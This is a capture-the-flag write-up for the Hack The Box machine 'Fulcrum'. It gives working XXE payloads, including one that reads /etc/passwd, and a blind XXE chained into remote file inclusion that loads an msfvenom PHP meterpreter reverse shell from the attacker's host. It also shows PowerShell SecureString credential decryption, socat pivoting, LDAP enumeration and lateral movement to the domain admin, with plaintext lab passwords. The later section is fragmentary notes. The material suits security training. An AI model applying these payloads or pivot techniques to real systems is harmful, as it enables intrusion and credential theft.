# Fulcrum
#### 10.10.10.62
###### Dotaplayer365

**Nmap:**

```
Nmap scan report for fulcrum.htb (10.10.10.62)
PORT     STATE SERVICE VERSION
4/tcp    open  http    nginx 1.10.3 (Ubuntu)
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.10.3 (Ubuntu)
88/tcp   open  http    nginx 1.10.3 (Ubuntu)
9999/tcp open  http    nginx 1.10.3 (Ubuntu)
56423/tcp open  unknown
```

After checking out whats there under those webservers 

* **10.10.10.62:4**

    Shows under maintenence

    <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Website-4.PNG"></kbd>

    We can see a structure like this: http://10.10.10.62:4/index.php?page=home

    There is a good chance thre is a RFI,  However when we run something like this (http://10.10.10.62:4/index.php?
page=http://10.10.14.99/test) it doesnt connect to our webserver

* **10.10.10.62:80**

    Gives a Server Error

    <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Website-80.PNG"></kbd>

* **10.10.10.62:88**

    Phpmyadmin

    <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Website-88.PNG"></kbd>


* **10.10.10.62:9999**

    PFSense Firewall
    
    <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Website-9999.PNG"></kbd>

* **10.10.10.62:56423**

    Looks like some api

    <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Fulcrum/Images/Website-56423.PNG"></kbd>


### Initial Foothold

The api at 56423 screams xxe

Lets create a xml file and post it to check if there is something fishy going on

xml.txt
```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "file:///etc/passwd">
]>
<r>&sp;</r>
```

```
curl -d @xml.txt http://10.10.10.62:56423
{"Heartbeat":{"Ping":"Pong"}}
```

It doesnt give us any kind of data, but there aint no errors either :confused:

From our notes earlier we know that there was a page on port 4 which could have had RFI however it wasnt working

There maybe a firewall rule not allowing it to be done from a external connection

So if we try and do a blind XXE and call the page internally, it just might work

Creating a new xml.txt
```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://127.0.0.1:4/index.php?page=http://10.10.14.171/dotatest.php">
]>
<r>&sp;</r>
```

Starting a SimpleHTTPServer
```
python -m SimpleHTTPServer 80
```

Exec curl
```
curl -d @xml.txt http://10.10.10.62:56423
```

BOOM! We got something
```
10.10.10.62 - - [13/Dec/2017 03:06:47] "GET /dotastest.php.php HTTP/1.0" 200 -
```

This means that the RFI does work when called internally.

We also see that it appends an extra ".php" in the GET request, so we can change the xml file as per the requirement

First, lets create a reverse shell php from msfvenom for a sweet meterpreter

```
msfvenom -p php/meterpreter/reverse_tcp  LHOST=10.10.14.99 LPORT=4442 > dotashell.php
```

Start a listner in msfconsole
```
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 10.10.14.99 
set LPORT 4442
run
```

Start a SimpleHTTP server where dotashell.php is stored
```
python -m SimpleHTTPServer 80
```

Create a new xml.txt
```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://127.0.0.1:4/index.php?page=http://10.10.14.99/dotashell">
]>
<r>&sp;</r>
```

Exec Payload
```
curl -d @xml.txt http://10.10.10.62:56423

10.10.10.62 - - [13/Dec/2017 03:26:08] "GET /dotashell.php HTTP/1.0" 200 -

[*] Meterpreter session 1 opened (10.10.14.99:4442 -> 10.10.10.62:36316) at 2017-12-13 03:26:08 -0500
meterpreter > 
```

We see a ps1 file in the machine O.o
```
meterpreter > cat Fulcrum_Upload_to_Corp.ps1
# TODO: Forward the PowerShell remoting port to the external interface
# Password is now encrypted \o/

$1 = 'WebUser'
$2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
$3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA=' 
$4 = $3 | ConvertTo-SecureString -key $2
$5 = New-Object System.Management.Automation.PSCredential ($1, $4)

Invoke-Command -Computer upload.fulcrum.local -Credential $5 -File Data.ps1
```

It does have the encrypted password as mentioned but i dont think it would be that hard to decypt it

We would just need to add this line to it and decrypt 
```
(New-Object System.Management.Automation.PSCredential 'N/A', $4).GetNetworkCredential().Password
```
We get the Username and Password as 


> Username : WebUser | Password : M4ng£m£ntPa55

We gotta find the upload.fulcrum.local

```
arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.122.228          ether   52:54:00:74:9d:17   C                     virbr0
10.10.10.2               ether   00:50:56:aa:9c:8d   C                     ens32
```

Lets upload a nmap static binary (https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and scan 192.168.122.228 for open ports 

```
wget http://10.10.14.99/nmap

chmod 777 nmap

./nmap -v -p- 192.168.122.228
PORT     STATE SERVICE
80/tcp   open  http
5986/tcp open  unknown
8080/tcp open  http-alt
```

That 5986 port looks familiar!!

That ip is the upload.fulcrum.local !!

I prefer using powershell from windows, instead of porting something to the linux machine or using some kind of script

So lets do some port forwading and get a powershell session! :smile:
* Steps
    * Download a Stand Alone socat binary from (https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)
    * Move it to the vm ``` upload socat ```
    * Port forward 5986 from upload.fulcrum.local ``` ./socat tcp-listen:5986,reuseaddr,fork tcp:192.168.122.228:5986```
    * Portforward te 5986 from the remote machine to the local kali machine ``` socat tcp-listen:5986,reuseaddr,fork tcp:10.10.10.62:5986 ```
    * Check on the kali machine if the portforwarding works ``` nc -nv 127.0.0.1 5986 ```
    * *The widows machine and the kali machine should be in the same network for this to work*
    

Create a script on the windows machine which would give us a PSSession
```
------------------------------------------------
$1 = 'WebUser'
$2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
$3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='
$4 = $3 | ConvertTo-SecureString -key $2
$5 = New-Object System.Management.Automation.PSCredential ($1, $4)
$a = New-PSSessionOption -SkipCACheck -SkipCNCheck
Enter-PSSession -Computer 192.168.1.41 -Credential $5 -UseSSL -SessionOption $a
------------------------------------------------
```


=> ps -aux on linux machine to find the vmdk names

10.25.25.1 => PfSense
10.25.25.2 => DC (LDAP)
10.25.25.3 => FILE Vm

=>Testing LDAP Creds to get Btables
------------------------------------------------
if ($env:computername  -eq $env:userdomain) { echo " no AD domain" } else { echo "must be in AD"}
no AD Domain
------------------------------------------------
$entry = new-object directoryservices.directoryentry("LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local","FULCRUM\LDAP","PasswordForSearching123!")
$searcher = new-object directoryservices.directorysearcher($entry);
$searcher.filter = "(objectClass=user)";
$searcher.findAll() | Select Path
------------------------------------------------
$entry = new-object directoryservices.directoryentry("LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local","FULCRUM\LDAP","PasswordForSearching123!")
$searcher = new-object directoryservices.directorysearcher($entry);
$searcher.filter ="(&(objectClass=user)(Name=*Bob*))"
$searcher.findAll() | Select Path
$searcher.filter ="(objectClass=user)"
$results = $searcher.findAll()
foreach($result in $results) { $user = $result.GetDirectoryEntry(); $user | Select * }
------------------------------------------------

=> Information about BTables User on the File Server
BTables@fulcrum.local
Username : BTables
Password : ++FileServerLogon12345++
Has logon rights to the file server

=> GET USER.TXT
 Invoke-Command -Computername file.fulcrum.local -ScriptBlock {type C:\Users\BTables\Desktop\user.txt} -credential $cred

=> Issue commands on file server
$session = New-PSSession –ComputerName file.fulcrum.local -credential $creds


Invoke-Command –Session $session –ScriptBlock {whoami}

=> There is check-auth.ps1 which has a script
Copy just the script into a ps1 file with tail 
ruin it with parameteres merged.txt
get domain admin creds 
923a,@fulcrum_bf392748ef4e_$

=> get root.txt
Invoke-Command -ComputerName File.fulcrum.local -Credential $creds -ScriptBlock {Invoke
-Command -ComputerName dc.fulcrum.local -Credential $creds -ScriptBlock {type ../../Administrator/Desktop/root.txt}}


